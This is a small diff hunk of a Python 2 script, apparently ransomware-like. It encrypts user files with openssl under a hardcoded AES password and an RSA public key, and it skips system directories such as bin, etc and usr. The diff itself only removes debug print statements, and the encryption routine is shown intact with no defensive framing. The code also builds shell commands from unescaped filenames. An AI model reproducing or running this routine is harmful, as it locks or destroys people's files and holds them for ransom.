@@ -4,14 +4,12 @@ import getpass
 aes_password="ricardo"
 unme=getpass.getuser()
 keypath="/home/"+unme+"/random/keys"
-print "Keypath = ",keypath
 excluded_dirs=["bin","boot","etc","usr","lib","media","dev","usr","sbin","root"]
 
 
 def encrypt_(fname):
 	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+" -out "+fname+".aes")
 	command=("openssl rsautl -encrypt -pubin -inkey "+keypath+"/public.pem -in "+fname+".aes -out "+fname+".rsa")
-	print command
 	os.system(command)
 	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+".rsa -out "+fname+".enc")
 	os.system("rm "+fname+".aes")
